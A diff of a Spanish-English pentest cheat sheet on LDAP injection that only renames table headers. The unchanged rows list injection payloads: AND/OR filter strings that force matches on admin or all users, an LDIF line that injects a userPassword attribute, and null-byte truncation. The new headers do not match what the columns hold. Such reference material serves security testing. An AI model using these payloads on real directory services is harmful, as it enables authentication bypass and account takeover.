@@ -22,7 +22,7 @@ linked:
 
 ## AND / OR Injection
 
-| **Operator** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | AND injection `&` | `*)(&(uid=admin)` | Force AND condition. |
 | OR injection `\|` | `*)(\|(uid=*` | Force OR — match all. |
@@ -72,7 +72,7 @@ ___
 
 ## LDAP Attribute Injection (en Add/Modify)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App escribe LDAP entries (registración, profile update) sin sanitizar | Modify/Add operations. |
 | Inject extra attribute | Field "name" = `John\nuserPassword: ATTACKER` | LDIF injection. |
@@ -92,7 +92,7 @@ ___
 
 ## LDAP Comments y Null-Byte
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | LDAP no tiene comments oficiales | RFC 4515 doesn't define comments | False trick. |
 | Null byte truncation | `username=admin\x00trailing` | Some apps truncate at NUL. |
